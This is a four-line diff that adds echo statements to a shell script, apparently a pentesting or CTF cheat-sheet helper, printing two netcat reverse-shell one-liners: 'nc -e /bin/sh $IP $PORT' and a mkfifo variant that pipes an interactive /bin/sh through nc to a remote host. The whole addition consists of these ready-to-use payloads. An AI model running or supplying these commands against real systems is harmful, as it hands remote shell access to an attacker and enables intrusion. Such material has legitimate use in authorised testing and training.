@@ -1,0 +1,4 @@
+echo -e "\033[31m\033[1mAlternative with -e working:\033[m"
+echo -e "\t\033[1mnc -e /bin/sh $IP $PORT\033[m"
+echo -e "\033[31m\033[1mAlternative withput -e:\033[m"
+echo -e "\t\033[1mrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f\033[m"
